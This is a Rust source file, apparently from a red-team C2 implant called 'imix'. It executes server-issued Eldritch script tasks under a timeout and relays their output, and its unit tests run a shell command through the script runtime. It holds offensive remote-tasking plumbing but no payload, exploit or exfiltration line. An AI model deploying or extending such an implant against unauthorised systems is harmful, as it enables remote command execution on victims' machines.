use crate::ImixPrintHandler;
use anyhow::{Error, Result};
use c2::pb::Task;
use chrono::{DateTime, Utc};
use eldritch::EldritchRuntime;
use eldritch::EldritchRuntimeFunctions;
use eldritch::EldritchTasksHandler;
use eldritch::PrintHandler;
use std::sync::mpsc::Receiver;
use std::sync::mpsc::Sender;
use std::thread;
use tokio::task::JoinHandle;
use tokio::time::Duration;

pub struct AsyncTask {
    pub future_join_handle: JoinHandle<Result<(), Error>>,
    pub start_time: DateTime<Utc>,
    pub grpc_task: Task,
    pub print_reciever: Receiver<String>,
}

pub struct ImixEldritchRuntimeFunctions {
    pub sender: Sender<String>,
}

impl EldritchRuntimeFunctions for ImixEldritchRuntimeFunctions {}

impl EldritchTasksHandler for ImixEldritchRuntimeFunctions {
    fn get_tasks() -> Vec<i64> {
        todo!()
    }

    fn kill_task(id: i64) {
        todo!()
    }
}

impl PrintHandler for ImixEldritchRuntimeFunctions {
    fn println(&self, text: &str) -> anyhow::Result<()> {
        let res = match self.sender.send(text.to_string()) {
            Ok(local_res) => local_res,
            Err(local_err) => return Err(anyhow::anyhow!(local_err.to_string())),
        };
        Ok(res)
    }
}

async fn handle_exec_tome(
    task: Task,
    print_channel_sender: Sender<String>,
) -> Result<(String, String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    // let task_quest = match task.quest {
    //     Some(quest) => quest,
    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
    // };

    // Execute a tome script
    let res = match thread::spawn(move || {
        let eldritch_runtime = EldritchRuntime {
            globals: EldritchRuntime::default().globals,
            funcs: &ImixEldritchRuntimeFunctions {
                sender: print_channel_sender,
            },
        };
        eldritch_runtime.run(
            task.id.to_string(),
            task.eldritch.clone(),
            Some(task.parameters.clone()),
        )
    })
    .join()
    {
        Ok(local_thread_res) => local_thread_res,
        Err(_) => todo!(),
    };
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

pub async fn handle_exec_timeout_and_response(
    task: Task,
    print_channel_sender: Sender<String>,
    timeout: Option<Duration>,
) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = timeout.unwrap_or_else(|| Duration::from_secs(60 * 60 * 24 * 7));

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());
    // Execute that future with a timeout defined by the timeout argument.
    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => match res {
            Ok(tome_result) => tome_result,
            Err(tome_error) => ("".to_string(), tome_error.to_string()),
        },
        Err(timer_elapsed) => (
            "".to_string(),
            format!(
                "Time elapsed task {} has been running for {} seconds",
                task.id,
                timer_elapsed.to_string()
            ),
        ),
    };

    print_channel_sender
        .clone()
        .send(format!("---[RESULT]----\n{}\n---------", tome_result.0))?;
    print_channel_sender
        .clone()
        .send(format!("---[ERROR]----\n{}\n--------", tome_result.1))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::handle_exec_tome;
    use anyhow::Result;
    use c2::pb::Task;
    use std::collections::HashMap;
    use std::sync::mpsc::channel;
    use std::time::Duration;

    #[test]
    fn imix_handle_exec_tome() -> Result<()> {
        let test_tome_input = Task {
            id: 123,
            eldritch: r#"
print(sys.shell(input_params["cmd"])["stdout"])
1"#
            .to_string(),
            parameters: HashMap::from([("cmd".to_string(), "echo hello_from_stdout".to_string())]),
        };

        let runtime = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();

        let (sender, receiver) = channel::<String>();

        let exec_future = handle_exec_tome(test_tome_input, sender.clone());
        let (eld_output, eld_error) = runtime.block_on(exec_future)?;

        let cmd_output = receiver.recv_timeout(Duration::from_millis(500))?;
        assert!(cmd_output.contains("hello_from_stdout"));
        assert_eq!(eld_output, "1".to_string());
        assert_eq!(eld_error, "".to_string());
        Ok(())
    }

    #[test]
    fn imix_handle_exec_tome_error() -> Result<()> {
        let test_tome_input = Task {
            id: 123,
            eldritch: r#"
aoeu
"#
            .to_string(),
            parameters: HashMap::new(),
        };

        let runtime: tokio::runtime::Runtime = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();

        let (sender, receiver) = channel::<String>();

        let exec_future = handle_exec_tome(test_tome_input, sender.clone());
        let (eld_output, eld_error) = runtime.block_on(exec_future)?;

        let mut index = 0;
        loop {
            let cmd_output = match receiver.recv_timeout(Duration::from_millis(500)) {
                Ok(local_res_string) => local_res_string,
                Err(local_err) => {
                    match local_err.to_string().as_str() {
                        "channel is empty and sending half is closed" => {
                            break;
                        }
                        "timed out waiting on channel" => break,
                        _ => eprint!("Error: {}", local_err),
                    }
                    break;
                }
            };
            assert_eq!(cmd_output, "".to_string());

            index = index + 1;
        }

        assert_eq!(eld_output, "".to_string());
        assert_eq!(eld_error, "[eldritch] Eldritch eval_module failed:\nerror: Variable `aoeu` not found\n --> 123:2:1\n  |\n2 | aoeu\n  | ^^^^\n  |\n".to_string());
        Ok(())
    }

    // This test
    //     #[test]
    //     fn imix_handle_exec_tome_timeout() -> Result<()> {
    //         let test_tome_input = Task {
    //             id: 123,
    //             eldritch: r#"
    // print("Hello_world")
    // time.sleep(5)
    // "#
    //             .to_string(),
    //             parameters: HashMap::new(),
    //         };

    //         let runtime: tokio::runtime::Runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         let (sender, receiver) = channel::<String>();

    //         let start_time = Instant::now();
    //         let exec_future = handle_exec_timeout_and_response(
    //             test_tome_input,
    //             sender.clone(),
    //             Some(Duration::from_secs(2)),
    //         );
    //         runtime.block_on(exec_future)?;
    //         let end_time = Instant::now();
    //         let mut index = 0;
    //         loop {
    //             let cmd_output = match receiver.recv_timeout(Duration::from_millis(800)) {
    //                 Ok(local_res_string) => local_res_string,
    //                 Err(local_err) => {
    //                     match local_err.to_string().as_str() {
    //                         "channel is empty and sending half is closed" => {
    //                             break;
    //                         }
    //                         "timed out waiting on channel" => break,
    //                         _ => eprint!("Error: {}", local_err),
    //                     }
    //                     break;
    //                 }
    //             };
    //             println!("eld_output: {}", cmd_output);
    //             index = index + 1;
    //         }

    //         println!(
    //             "Diff {:?}",
    //             end_time.checked_duration_since(start_time).unwrap()
    //         );
    //         assert!(end_time.checked_duration_since(start_time).unwrap() < Duration::from_secs(3));

    //         Ok(())
    //     }
}
